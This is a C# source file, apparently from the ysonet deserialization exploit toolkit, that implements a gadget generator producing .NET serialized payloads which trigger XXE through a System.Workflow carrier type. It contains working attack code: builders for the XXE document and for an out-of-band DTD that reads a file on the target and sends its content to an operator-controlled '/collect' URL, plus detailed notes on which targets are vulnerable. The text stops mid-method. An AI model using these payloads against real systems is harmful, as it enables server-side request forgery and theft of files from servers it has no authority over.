using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * XmlDocumentSurrogateXxe: reaches XmlDocument.InnerXml from an IObjectReference carrier,
     * so the runtime and DataContract formatters can drive an XXE that the property-setting
     * formatters own.
     *
     * THE CARRIER IS FOUR LINES OF System.Workflow.ComponentModel. It is a private nested
     * class of the workflow XML surrogate, and the whole type is this:
     *
     *   internal sealed class XmlDocumentSurrogate : ISerializationSurrogate
     *   {
     *       [Serializable]
     *       private sealed class XmlDocumentReference : IObjectReference
     *       {
     *           private string innerXml = string.Empty;
     *
     *           object IObjectReference.GetRealObject(StreamingContext context)
     *           {
     *               XmlDocument xmlDocument = new XmlDocument();
     *               if (!string.IsNullOrEmpty(innerXml))
     *               {
     *                   xmlDocument.InnerXml = innerXml;
     *               }
     *               return xmlDocument;
     *           }
     *       }
     *       ...
     *   }
     *
     * THE SURROGATE HALF IS IRRELEVANT TO THE PAYLOAD. XmlDocumentReference is [Serializable]
     * and is NOT ISerializable, so a formatter restores the single innerXml FIELD directly
     * and then calls GetRealObject during fixup. Nothing has to be registered on the target:
     * no surrogate selector, no configuration, no workflow object in the graph.
     *
     * TRIGGER TO SINK, COMPLETE:
     *
     *   innerXml field restored          <- the operator's XML
     *     -> IObjectReference.GetRealObject
     *     -> XmlDocument.InnerXml setter        set { LoadXml(value); }
     *     -> XmlDocument.LoadXml(string)        SetupReader(new XmlTextReader(new StringReader(xml), NameTable))
     *     -> XmlTextReaderImpl(XmlNameTable)    the resolver decision
     *
     * WHAT GATES IT, and it is not a CLR build. GetRealObject creates a FRESH XmlDocument and
     * never assigns XmlResolver, so SetupReader's HasSetResolver is false and the reader keeps
     * its own default, which XmlReaderSettings.EnableLegacyXmlSettings() decides:
     *
     *   legacy   -> new XmlUrlResolver()   -> the external subset is fetched
     *   hardened -> null                   -> nothing is fetched
     *
     * and that switch is true when the deserializing APPLICATION targets below .NET Framework
     * 4.5.2, or when the machine opted back in through the EnableLegacyXmlSettings switch, or
     * when the application declares NO target framework moniker at all. So the declared span
     * 4.0 - 4.5.1 is about the framework the TARGET APP WAS BUILT AGAINST, not the one installed
     * where it runs, and not this tool's own. This is the same gate DataViewManagerXxe and
     * DataSetXxe declare.
     *
     * THE ABSENT-MONIKER ROUTE IS THE ONE PEOPLE MISS, and it is not a version at all, which is
     * why it lives in AdditionalInfo() rather than on the version axis. BinaryCompatibility
     * reads AppDomain.CurrentDomain.GetTargetFrameworkName(); a null or unparseable result
     * becomes TargetFrameworkId.Unspecified, and AddQuirksForFramework sets NO quirks for it -
     * so legacy XML is ON. An ASP.NET application runs in a NON-default AppDomain (so the
     * entry-assembly TargetFrameworkAttribute fallback never applies) and gets its moniker from
     * <httpRuntime targetFramework="...">, which HttpRuntimeSection.GetTargetFrameworkName()
     * returns as NULL when the attribute is absent. An ASP.NET app with no targetFramework
     * attribute is therefore legacy on a fully patched 4.8.1 machine.
     *
     * THERE IS NO "BRING YOUR OWN RESOLVER" HERE, unlike XmlDocumentXxe variant 2. The payload
     * never touches the XmlDocument: GetRealObject constructs it, sets one property and returns
     * it, so there is nowhere to put a resolver. That is the honest trade for reaching a
     * completely different formatter family.
     *
     * TWO VARIANTS, AND THEY ARE NOT THE SAME EFFECT (the same split DataSetXxe ships):
     *
     *   variant 1  the payload declares one external parameter entity and references it, so the
     *              target fetches a URL you name. That is SSRF and nothing else: no file content
     *              comes back to you.
     *   variant 2  the payload points at a DTD YOU HOST, and ysonet writes that DTD for you. The
     *              hosted DTD reads a file on the target and sends its content back in the query
     *              string of a second request. That is real file disclosure, and it is why
     *              variant 2 declares file-system and information-disclosure on top of network.
     *              It needs TWO artifacts: the payload, and the DTD you must publish.
     *
     * ASSEMBLY REQUIREMENT: System.Workflow.ComponentModel, the same assembly
     * ActivitySurrogateSelector and ActivitySurrogateSelectorFromFile already need. A target
     * that accepts those accepts this.
     *
     * HOW THIS DIFFERS FROM THE OTHER XXE GADGETS IN THIS CATALOG:
     *
     *   XmlDocumentXxe        the same InnerXml sink, but reached by SETTING the property on a
     *                         real XmlDocument, so the property-assigning formatters (Xaml,
     *                         JavaScriptSerializer, FastJson, YamlDotNet, SharpSerializer,
     *                         MessagePack Typeless) are the ones that work - none of which
     *                         appear below. It can also install its own resolver.
     *   DataViewManagerXxe    a property setter on System.Data.DataViewManager, same family as
     *                         XmlDocumentXxe.
     *   DataSetXxe            the ISerializable CONSTRUCTOR of System.Data.DataSet. Closest
     *                         formatter list to this one, but a constructor is not a fixup:
     *                         DataSet's DataContract path silently does nothing, while the
     *                         DataContract family really does drive this carrier.
     *
     * LOCAL SAFETY. The generator never constructs the carrier or an XmlDocument: an inert
     * marshal names the type for the runtime formatters, and the DataContract, Json and
     * FsPickler documents are hand written. Nothing in -c or --file is opened, resolved or
     * contacted while building; --file names a path on the TARGET and is written into the
     * hosted DTD as text. None of the inputs is validated for shape beyond variant 1's shared
     * URL check, because what resolves as a system identifier is the TARGET parser's decision.
     * The one local side effect is the file variant 2 writes at --dtd-out, which replaces what
     * is there and creates a missing folder, and is written only after the payload is built so
     * a failed run changes nothing. -t is ALLOWED and behaves like the other network gadgets -
     * it deserializes the payload here, so THIS machine performs the fetch. On a normal (4.7.2)
     * ysonet.exe the hardened default means the resolver is null and nothing is fetched, which
     * the gadget explains on stderr.
     */
    public class XmlDocumentSurrogateXxeGenerator : GenericGenerator
    {
        // Public so the tests can name the exact type and member instead of repeating them.
        public const string CarrierClrName =
            "System.Workflow.ComponentModel.Serialization.XmlDocumentSurrogate+XmlDocumentReference";
        public const string CarrierAssemblyName =
            "System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        public const string CarrierTypeName = CarrierClrName + ", " + CarrierAssemblyName;

        // The one field GetRealObject reads. A private field, so this is the name the
        // formatters match on, not a property name.
        public const string InnerXmlMemberName = "innerXml";

        // The DataContract name of the carrier. A NESTED type's contract name carries its
        // outer type with a dot, and the namespace is the CLR namespace under the standard
        // data-contract prefix. Both were read off what NetDataContractSerializer itself wrote
        // for this type rather than derived by hand.
        public const string CarrierContractName = "XmlDocumentSurrogate.XmlDocumentReference";
        public const string CarrierContractNamespace =
            "http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Serialization";

        public const int VariantExternalDtd = 1;
        public const int VariantOobFileRead = 2;

        // Canonical long option names, so the generator, its help, the variant option scope
        // and the tests cannot drift apart.
        public const string VariantOptionName = "variant";
        public const string RawInputOptionName = "rawinput";
        public const string TargetFileOptionName = "file";
        public const string DtdOutOptionName = "dtd-out";

        // Shown in the empty-input refusal and in the option help.
        public const string ExampleUrl = "http://127.0.0.1:8080/x.dtd";

        // The two paths variant 2 builds under the collaborator base URL. The payload fetches
        // the first; the hosted DTD sends the file content to the second. The companion name is
        // this gadget's OWN, not DataSetXxe's, so an operator hosting both at once does not
        // have one overwrite the other.
        public const string CompanionDtdName = "xmldocsurrogate-oob.dtd";
        public const string CollectPath = "collect";

        // Characters that BREAK the variant 2 chain when they appear in the disclosed file,
        // measured on .NET Framework 4.8.1 against a 4.5.1-targeted app (see the option help).
        // Kept as one string so the help text and the tests read the same list.
        public const string OobBreakingCharacters = "& % ' #";

        private int variantNumber = VariantExternalDtd;
        private bool rawInput;
        private string targetFileUri;
        private string dtdOutPath;

        // ---- Metadata ----------------------------------------------------------

        // The proven effect is one outbound request made by the target, so the kind is
        // network. Information disclosure is deliberately NOT declared: fetching an external
        // DTD proves SSRF, and nothing in this chain returns file content to the sender.
        //
        // Versions describe the TARGET, and the deciding number is the framework the target
        // APPLICATION was BUILT against: EnableLegacyXmlSettings() reads the entry assembly's
        // TargetFrameworkAttribute once per process, so an app stamped below 4.5.2 fetches on
        // a fully patched machine and one stamped 4.5.2 or above never does, on any build.
        // Hence 4.0 to 4.5.1. TWO routes into the same gate are NOT versions and stay in
        // AdditionalInfo(): a machine where the EnableLegacyXmlSettings switch was turned back
        // on, and an application that declares NO target framework moniker at all - which for
        // an ASP.NET application means no <httpRuntime targetFramework> in web.config, and
        // leaves it legacy on a fully patched 4.8.1 machine.
        //
        // BuiltIn: System.Workflow.ComponentModel is a .NET Framework GAC assembly, the same
        // one ActivitySurrogateSelector needs and declares BuiltIn for. Whether the target
        // process has loaded it is an operator check, and it is stated in AdditionalInfo()
        // rather than moved onto this axis.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
        }

        // The carrier is not named in any published write-up this project has archived: the
        // XXE-setter class is Friday the 13th's, but this IObjectReference route to it was
        // found by this project's .NET Framework graph research.
        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a
        // long one pushes the formatter, command-input and category lines off the screen.
        public override string AdditionalInfo()
        {
            return "A [Serializable] IObjectReference carrier in System.Workflow.ComponentModel whose "
                + "GetRealObject sets XmlDocument.InnerXml, so the target parses your XML. Variant 1 makes "
                + "the target fetch your URL; variant 2 reads a target file back to you. No surrogate "
                + "selector has to be registered. Needs System.Workflow.ComponentModel. Fires when the "
                + "target app uses pre-4.5.2 XML resolver defaults, when the machine turned the "
                + "EnableLegacyXmlSettings switch back on, or when the app declares NO target framework "
                + "moniker at all - an ASP.NET app with no <httpRuntime targetFramework> is legacy even on "
                + "a fully patched 4.8.1 machine.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and names a framework type of its own. It
            // reuses no other gadget and no other gadget reuses it.
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter that restores a [Serializable] type's FIELDS and then performs the
        // IObjectReference fixup, and only those. Both halves are required and they are
        // independent, which is what makes this list worth measuring rather than reasoning
        // about.
        //
        // MEASURED, not assumed. Each cell was settled by deserializing a document carrying a
        // benign "<probe/>" and requiring the result to be an XmlDocument whose DocumentElement
        // is named "probe" - which can only be true if GetRealObject ran AND LoadXml parsed.
        //
        // FsPickler IS IN, and it needs its behaviour written down. It performs the fixup - the
        // XmlDocument is really built, so the parse and its fetch really happen - and then
        // casts the substituted object back to the DECLARED type and throws
        // "Unable to cast object of type 'System.Xml.XmlDocument' to type
        // 'XmlDocumentReference'". That exception is simultaneously the evidence the chain ran
        // and the reason the object never lands in the target's graph. For this gadget that
        // costs nothing, because the whole effect completes INSIDE GetRealObject; it would be
        // worthless for a carrier whose point is to be held afterwards.
        //
        // WHAT IS OUT, and every one of them was measured rather than reasoned about:
        //   Json.NET, JavaScriptSerializer, SharpSerializerXml - the DANGEROUS silent ones.
        //     They build a real XmlDocumentReference, deliver innerXml, throw nothing, and
        //     never run the fixup, so the payload deserializes cleanly and does nothing.
        //     A generation-only or "did it throw" check would pass all three.
        //   FastJson    MethodAccessException inside fastJSON's generated accessor.
        //   YamlDotNet  NullReferenceException; it cannot build the private nested type.
        //   Xaml        "Cannot create unknown type ... XmlDocumentReference" - a XAML type
        //     must be public.
        //   XmlSerializer  "...is inaccessible due to its protection level. Only public types
        //     can be processed."
        //   Both MessagePack Typeless flavours - same family as the silent three: they assign
        //     members by name and implement no IObjectReference fixup.
        //
        // The "(2)" suffix is a display-only annotation meaning "this formatter carries 2
        // variants". Both variants ship the same wire shape and differ only in what the XML
        // inside it says, so every formatter carries both.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter + " (2)",
                Formatters.SoapFormatter + " (2)",
                Formatters.LosFormatter + " (2)",
                Formatters.NetDataContractSerializer + " (2)",
                Formatters.DataContractSerializer + " (2)",
                Formatters.DataContractJsonSerializer + " (2)",
                Formatters.FsPickler + " (2)",
            };
        }

        // -c is a URL the TARGET fetches. Nothing is resolved or contacted while building.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 inherits the gadget's facets (a null override means "same"), and
                // declares the two options it has no use for so the interactive editor hides
                // them and never carries a value over from another module.
                new GadgetVariant(VariantExternalDtd,
                        "Fetch an external DTD: the target requests your URL (SSRF, default)")
                    .WithoutOptions(TargetFileOptionName, DtdOutOptionName),

                // Variant 2 overrides the WHOLE facet set, which is why the requirements AND the
                // versions are repeated: it reads a file on the target and returns its content,
                // so it is file-system and information-disclosure as well as network, but it
                // goes through the same legacy XmlTextReader and so lands on exactly the same
                // target framework span. Inputs are declared rather than derived, because the
                // accepted input is broader than -c alone: a collaborator URL plus a
                // target-side path in --file.
                new GadgetVariant(VariantOobFileRead,
                        "Read a target file out of band: needs --file, --dtd-out and a host you control")
                    .WithoutOptions(RawInputOptionName)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Network, PayloadKind.FileSystem,
                            PayloadKind.InformationDisclosure)
                        .WithInputs(PayloadInput.RemoteUrl, PayloadInput.TargetPath)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)),
            };
        }

        public override OptionSet Options()
        {
            // Not RawInputOption(): that shared help says formatter-layer escaping is turned
            // off, which is NOT what happens here. The finished XML is always escaped for the
            // outer payload; --rawinput only skips the check on the URL itself.
            return new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which XML to put in the carrier's innerXml field. Choices:\r\n"
                        + VariantExternalDtd + " (default) - declare one external parameter "
                        + "entity pointing at the -c URL and reference it, so the target FETCHES "
                        + "that URL. The effect is a single outbound request (SSRF / callback) "
                        + "and nothing comes back to you. Point it at any http or https URL you "
                        + "can observe.\r\n"
                        + VariantOobFileRead + " - read a file on the TARGET and have the target "
                        + "send its content to you. -c is the BASE URL of a host you control; "
                        + "ysonet builds two URLs under it, \"" + CompanionDtdName + "\" and \""
                        + CollectPath + "\". --file names what to read on the TARGET, in whatever "
                        + "form that target's parser resolves. --dtd-out is where ysonet writes "
                        + "the DTD you must publish at the first URL: without it hosted, the "
                        + "payload fetches a 404 and nothing is disclosed. Read the file content "
                        + "out of the query string of the request that arrives at the second URL.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    RawInputOptionName,
                    "Skip the URL validation and put -c into the DTD external identifier exactly "
                        + "as typed, with no trimming. Normal mode accepts an absolute http or "
                        + "https URL and refuses whitespace, control characters and the "
                        + "characters \" < > \\, because the value goes inside a QUOTED DTD "
                        + "external identifier and those would corrupt or escape it. Use this "
                        + "only for research on a resolver that accepts something else; the "
                        + "network effect this gadget declares was proven with http(s). It does "
                        + "NOT turn off the outer formatter's escaping, so the payload is still "
                        + "a valid document - but nothing checks that the identifier inside it "
                        + "still is, and a broken one simply fetches nothing.",
                    v => { if (v != null) rawInput = true; }
                },
                {
                    TargetFileOptionName + "=",
                    "Variant " + VariantOobFileRead + " only, and required there. What to read "
                        + "ON THE TARGET, usually an absolute file: URI, for example "
                        + "\"file:///C:/Windows/system.ini\". The value is NOT validated or "
                        + "rewritten: it goes into the hosted DTD exactly as typed, so a bare "
                        + "path, a UNC path, an http URL or any other form the target's XML "
                        + "parser resolves is accepted, and finding out what it resolves is the "
                        + "point. Nothing is opened on this machine. It sits in a quoted DTD "
                        + "system identifier, where no references are recognised, so '%' and '&' "
                        + "are literal and \"file:///C:/Program%20Files/x.txt\" is the right way "
                        + "to write a space; only a double quote ends the identifier and breaks "
                        + "the DTD. WHAT COMES BACK RELIABLY, measured rather than assumed: the "
                        + "content travels in a URL query string, so spaces, line breaks, < > "
                        + "and \" all arrive percent-encoded and can be decoded. Any of "
                        + OobBreakingCharacters + " in the file BREAKS the chain and you get no "
                        + "second request at all, because the first three end a construct inside "
                        + "the DTD and the last one starts a URI fragment. That is why a short "
                        + ".ini style file comes back whole and a file full of entity references "
                        + "or apostrophes does not.",
                    v => targetFileUri = v
                },
                {
                    DtdOutOptionName + "=",
                    "Variant " + VariantOobFileRead + " only, and required there. Where to write "
                        + "the companion DTD you have to publish at <-c>/" + CompanionDtdName
                        + ". The path is taken as given: a file already there is REPLACED and a "
                        + "missing folder is created, so generating twice to the same path works "
                        + "and ysonet says on stderr when it replaced something. The DTD is "
                        + "written only after the payload is built, so a failed run leaves what "
                        + "is already at that path alone. UTF-8 with no BOM, because the target "
                        + "reads it as an external subset with no XML declaration to learn an "
                        + "encoding from. This is separate from --outputpath, which still "
                        + "receives the payload itself.",
                    v => dtdOutPath = v
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (variantNumber != VariantExternalDtd && variantNumber != VariantOobFileRead)
                throw new ArgumentException(Name() + " has no variant " + variantNumber
                    + ". Use --" + VariantOptionName + " " + VariantExternalDtd
                    + " (fetch an external DTD) or --" + VariantOptionName + " " + VariantOobFileRead
                    + " (read a target file out of band).");

            object payload = variantNumber == VariantExternalDtd
                ? BuildPayload(XxeXml(ExternalDtdUrl(inputArgs)), formatter, inputArgs)
                : GenerateOobFileRead(formatter, inputArgs);

            ExplainSelfTest(inputArgs);
            return payload;
        }

        // When the operator runs -t and gets no request, it is almost always because THIS
        // ysonet build (4.7.2) hands its XmlTextReader a null resolver, so the fetch the payload
        // asks for had nothing to resolve with. That is the correct result, not a broken
        // payload. This carrier has no way to bring its own resolver, unlike XmlDocumentXxe
        // variant 2: GetRealObject constructs the XmlDocument itself and never assigns one.
        private void ExplainSelfTest(InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return;

            string note = Helpers.Core.LegacyXmlDefaults.SelfTestCannotFetchNote(Name());
            if (note != null)
                Console.Error.WriteLine(note);

            if (variantNumber == VariantOobFileRead)
                Console.Error.WriteLine(Name() + ": -t cannot show the file read either way - the "
                    + "disclosure needs the companion DTD hosted at your --dtd-out URL and a "
                    + "target that fetches it. Publish the DTD and watch the /" + CollectPath
                    + " endpoint to see the content arrive.");
        }

        // ---- Variant 1: fetch an external DTD ----------------------------------

        private string ExternalDtdUrl(InputArgs inputArgs)
        {
            RefuseOobOnlyOptions();

            string cmd = inputArgs == null ? null : inputArgs.Cmd;
            return rawInput
                ? DtdSystemLiteral.RequireRawValue(cmd, Name())
                : DtdSystemLiteral.ValidateHttpUrl(cmd, Name(), ExampleUrl);
        }

        // Refusing beats ignoring: a silently dropped --dtd-out would leave the operator waiting
        // for a DTD file that was never written.
        private void RefuseOobOnlyOptions()
        {
            if (targetFileUri != null)
                throw new ArgumentException(Name() + " variant " + VariantExternalDtd
                    + " does not use --" + TargetFileOptionName + ". That option belongs to "
                    + "variant " + VariantOobFileRead + ", which reads a target file; variant "
                    + VariantExternalDtd + " only makes the target fetch the -c URL. Add --"
                    + VariantOptionName + " " + VariantOobFileRead + " or drop the option.");

            if (dtdOutPath != null)
                throw new ArgumentException(Name() + " variant " + VariantExternalDtd
                    + " does not use --" + DtdOutOptionName + ". Variant " + VariantExternalDtd
                    + " emits one payload and no companion file; only variant "
                    + VariantOobFileRead + " writes a DTD for you to host.");
        }

        // ---- Variant 2: out-of-band file read ----------------------------------

        // Order matters here and is deliberate: the inputs are read first, then the payload is
        // built, and only then is the companion DTD written. So a missing option or a formatter
        // this gadget cannot produce still leaves the operator's disk exactly as it was -
        // including a file already sitting at --dtd-out, which a successful run WOULD replace.
        private object GenerateOobFileRead(string formatter, InputArgs inputArgs)
        {
            string collaborator = CollaboratorBaseUrl(inputArgs);
            string fileUri = TargetFileUri();
            string outPath = CompanionDtdDestination();

            string companion = OobDtd(collaborator, fileUri);
            object payload = BuildPayload(XxeXml(collaborator + CompanionDtdName), formatter, inputArgs);
            bool replaced = WriteCompanionDtd(outPath, companion);

            // Variant 2 does nothing unless the operator hosts the DTD, so the instructions are
            // essential operator info in a normal run, not a debug aside. It goes to STDERR so
            // it never mixes into the payload on stdout. The DTD file itself carries the full
            // instructions in a header comment; this block adds the one thing the file cannot
            // know - WHERE it was written - and shows the exact bytes so the operator need not
            // open it.
            Console.Error.WriteLine();
            Console.Error.WriteLine("=== " + Name() + " variant " + VariantOobFileRead
                + ": host this DTD to complete the chain ===");
            Console.Error.WriteLine("Wrote the companion DTD to: " + outPath
                + (replaced ? "  (replaced the file that was already there)" : ""));
            Console.Error.WriteLine("Publish it at:              " + collaborator + CompanionDtdName);
            Console.Error.WriteLine("Then watch for the file at: " + collaborator + CollectPath + "?d=<content>");
            Console.Error.WriteLine("The DTD (readable on purpose, and self-documenting):");
            foreach (string line in companion.Split('\n'))
                Console.Error.WriteLine("  " + line.TrimEnd('\r'));
            Console.Error.WriteLine("Reliable only for files without " + OobBreakingCharacters
                + " (see -g " + Name() + " help). Nothing was read on this machine; --file names "
                + "a path on the TARGET.");
            Console.Error.WriteLine();

            return payload;
        }

        // The base location both hosted paths hang off, taken exactly as typed. Variant 2 does
        // not run the http/https check variant 1 uses: where an operator can publish a DTD, and
        // what a target will fetch it from, is not this gadget's decision.
        private string CollaboratorBaseUrl(InputArgs inputArgs)
        {
            string url = DtdSystemLiteral.RequireRawValue(
                inputArgs == null ? null : inputArgs.Cmd, Name());

            // The two names are APPENDED, so the value needs a separator at the end. Adding one
            // is mechanics, not validation: a backslash counts, so a UNC or file path base is
            // not turned into "\\host\share\/xmldocsurrogate-oob.dtd".
            if (url.EndsWith("/", StringComparison.Ordinal)
                || url.EndsWith("\\", StringComparison.Ordinal))
                return url;

            return url + "/";
        }

        // What to read ON THE TARGET, written into the hosted DTD exactly as typed - not
        // trimmed, not rewritten, not checked for shape. Nothing here opens or resolves it, and
        // it does not have to exist on this machine. What a target's XML resolver accepts as a
        // system identifier is the thing this gadget is used to find out, so a file: URI, a bare
        // Windows path, a UNC path or an http URL all go through unchanged.
        private string TargetFileUri()
        {
            if (string.IsNullOrEmpty(targetFileUri))
                throw new ArgumentException(Name() + " variant " + VariantOobFileRead
                    + " needs --" + TargetFileOptionName
                    + " \"file:///C:/Windows/system.ini\": what to read ON THE TARGET. Any form "
                    + "the target's XML parser resolves is accepted and it is never opened on "
                    + "this machine, but it cannot be empty.");

            return targetFileUri;
        }

        // Where the companion DTD goes. The path is resolved to a full one so the stderr block
        // can print where the file actually landed, and that is all: an existing file is
        // replaced and a missing folder is created, because the operator named this exact path.
        //
        // Nothing is written HERE. The write happens after the payload is built (see
        // GenerateOobFileRead), so a bad input or a formatter this gadget cannot produce still
        // leaves an existing file at that path untouched.
        private string CompanionDtdDestination()
        {
            if (string.IsNullOrWhiteSpace(dtdOutPath))
                throw new ArgumentException(Name() + " variant " + VariantOobFileRead
                    + " needs --" + DtdOutOptionName + " \"<local path>\": the file ysonet "
                    + "writes for you to publish at <-c>/" + CompanionDtdName
                    + ". Without that DTD hosted, the payload fetches a 404 and discloses "
                    + "nothing.");

            return Path.GetFullPath(dtdOutPath.Trim());
        }

        /// <summary>
        /// The DTD the operator publishes at &lt;collaborator&gt;/xmldocsurrogate-oob.dtd. It is
        /// written out in full, with the target path and the collect endpoint spelled out,
        /// because a reader has to be able to copy it to a web root and understand what it does.
        ///
        /// %file; reads the target file. %build; is an entity whose VALUE is another entity
        /// declaration, so referencing it declares %exfil; with the file content already
        /// substituted into the URL. Referencing %exfil; then makes the target fetch that URL,
        /// which is how the content reaches the operator.
        ///
        /// &amp;#x25; is a literal '%'. It has to be written that way so the inner declaration
        /// is BUILT here and expanded on the target, instead of being expanded while the
        /// %build; entity value itself is parsed.
        ///
        /// This nesting lives in the EXTERNAL DTD, not in the payload, because an internal
        /// subset cannot reference a parameter entity inside a markup declaration.
        ///
        /// It is deliberately this gadget's OWN copy rather than a call into DataSetXxe: the DTD
        /// text IS the payload, and a shared builder would make one edit for one gadget silently
        /// change the other (ysonet/Generators/README.md, self-containment). If a third consumer
        /// ever appears, extract the gadget-agnostic MECHANICS (write UTF-8 with no BOM, report
        /// a replacement) and pass the DTD text in - never the DTD itself.
        /// </summary>
        internal static string OobDtd(string collaboratorBaseUrl, string targetFileUri)
        {
            // A header comment says what to DO with the file, so an operator who only ever sees
            // the payload on stdout and a new file on disk still learns that this one has to be
            // published and where. It is a legal XML comment, so the DTD stays a valid external
            // subset and can be served exactly as written.
            //
            // A comment must not contain a double hyphen, which would make the served DTD
            // unparseable, so the instructions below use no "--".
            string header =
                  "ysonet XmlDocumentSurrogateXxe companion DTD. Publish this file, unchanged, at\n"
                + "     " + collaboratorBaseUrl + CompanionDtdName + "\n"
                + "     and watch for the file content in the d= query string of a request to\n"
                + "     " + collaboratorBaseUrl + CollectPath + "\n"
                + "     It reads " + targetFileUri + " on the target. Reliable only for files\n"
                + "     with none of " + OobBreakingCharacters + " in them. The ENTITY lines\n"
                + "     below are authoritative if this note ever shows a value differently.";

            // A double hyphen is illegal inside an XML comment, and an operator's base URL or
            // target URI could contain one, which would make the SERVED DTD unparseable and
            // silently break their own chain. Neutralise it for the human note only; the
            // authoritative copies are the ENTITY declarations below, which are never touched.
            header = header.Replace("--", "- -");

            return "<!-- " + header + " -->\n"
                 + "<!ENTITY % file SYSTEM \"" + targetFileUri + "\">\n"
                 + "<!ENTITY % build \"<!ENTITY &#x25; exfil SYSTEM '"
                 + collaboratorBaseUrl + CollectPath + "?d=%file;'>\">\n"
                 + "%build;\n"
                 + "%exfil;\n";
        }

        // Writes the DTD where the operator asked, UTF-8 without a BOM. A BOM would be the first
        // bytes of the external subset and the target's DTD parser has no XML declaration to
        // learn the encoding from, so it must not be there.
        //
        // The path is taken at face value: a missing folder is created and an existing file is
        // replaced, so generating twice to the same path works. Returns true when a file was
        // replaced, which the caller reports on stderr - the operator should be told their file
        // changed, even though they asked for it.
        private bool WriteCompanionDtd(string path, string content)
        {
            string folder = Path.GetDirectoryName(path);
            bool createdFolder = false;
            if (!string.IsNullOrEmpty(folder) && !Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
                createdFolder = true;
            }

            bool replaced = File.Exists(path);
            bool created = false;
            try
            {
                byte[] bytes = new UTF8Encoding(false).GetBytes(content);
                using (var stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    created = !replaced;
                    stream.Write(bytes, 0, bytes.Length);
                }
            }
            catch (Exception)
            {
                // Only ever remove what THIS call brought into existence. A file that was
                // already there is left where it is: FileMode.Create has already truncated it,
                // and deleting it as well would take the operator's own path away too.
                if (created)
                {
                    try { File.Delete(path); } catch { }
                }
                // Same rule for the folder. Only the leaf is removed, so a deeper chain can
                // leave empty parents behind - harmless, and worth less than the complexity of
                // unwinding them.
                if (createdFolder)
                {
                    try { Directory.Delete(folder); } catch { }
                }
                throw;
            }

            return replaced;
        }

        /// <summary>
        /// The XML GetRealObject hands to XmlDocument.InnerXml. LoadXml builds an XmlTextReader
        /// over it and reads it, which parses the DOCTYPE first, so the external parameter
        /// entity is fetched before anything else in the document matters.
        ///
        /// %remote; is REFERENCED as well as declared: a parameter entity that is only declared
        /// is never resolved, so the reference is what forces the fetch.
        ///
        /// The DOCTYPE name matches the root element so the document is well formed. The name
        /// itself is arbitrary - nothing on the target compares it.
        /// </summary>
        internal static string XxeXml(string dtdUrl)
        {
            return "<!DOCTYPE xd ["
                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
                 + "%remote;"
                 + "]><xd/>";
        }

        private object BuildPayload(string xml, string formatter, InputArgs inputArgs)
        {
            if (IsFormatter(formatter, Formatters.BinaryFormatter)
                || IsFormatter(formatter, Formatters.SoapFormatter)
                || IsFormatter(formatter, Formatters.LosFormatter))
                // Serialize() owns minification of the OUTER payload and the -t read-back. The
                // XML is deliberately not minified separately: it is already one line, and
                // rewriting it here would be a second, invisible transformation of the
                // operator's URL.
                return Serialize(new XmlDocumentReferenceMarshal(xml), formatter, inputArgs);

            if (IsFormatter(formatter, Formatters.NetDataContractSerializer))
                return FinishHandWrittenPayload(BuildNetDataContractPayload(xml), formatter, inputArgs);

            if (IsFormatter(formatter, Formatters.DataContractSerializer))
                return FinishHandWrittenPayload(BuildDataContractPayload(xml), formatter, inputArgs);

            if (IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return FinishHandWrittenPayload(BuildDataContractJsonPayload(xml), formatter, inputArgs);

            if (IsFormatter(formatter, Formatters.FsPickler))
                return FinishHandWrittenPayload(BuildFsPicklerPayload(xml), formatter, inputArgs);

            throw UnsupportedFormatter(formatter);
        }

        // NetDataContractSerializer carries the real CLR identity in z:Type / z:Assembly, so it
        // can name a private nested type the way the runtime formatters do. The document below
        // is what NDCS itself emits for a plain [Serializable] type with one private string
        // field, with the type identity retargeted; the field element sits in the type's own
        // DATA CONTRACT namespace (an ISerializable marshal would put it in the empty one, and
        // this carrier is not ISerializable).
        private string BuildNetDataContractPayload(string xml)
        {
            return @"<" + CarrierContractName + @" z:Id=""1"" z:Type=""" + CarrierClrName
                + @""" z:Assembly=""" + CarrierAssemblyName
                + @""" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""" + CarrierContractNamespace + @""">
  <" + InnerXmlMemberName + @" z:Id=""2"">" + EscapeForXmlText(xml, rawInput) + @"</" + InnerXmlMemberName + @">
</" + CarrierContractName + @">";
        }

        // Plain DataContractSerializer carries no type information at all, so this project
        // wraps its payloads in the <root type="..."> envelope that states the root type a real
        // consumer would have fixed in its own code. Inside it the document is exactly what DCS
        // writes for this shape: the contract element, and the field in the contract namespace.
        private string BuildDataContractPayload(string xml)
        {
            return @"<root type=""" + CarrierTypeName + @""">
  <" + CarrierContractName + @" xmlns=""" + CarrierContractNamespace + @""">
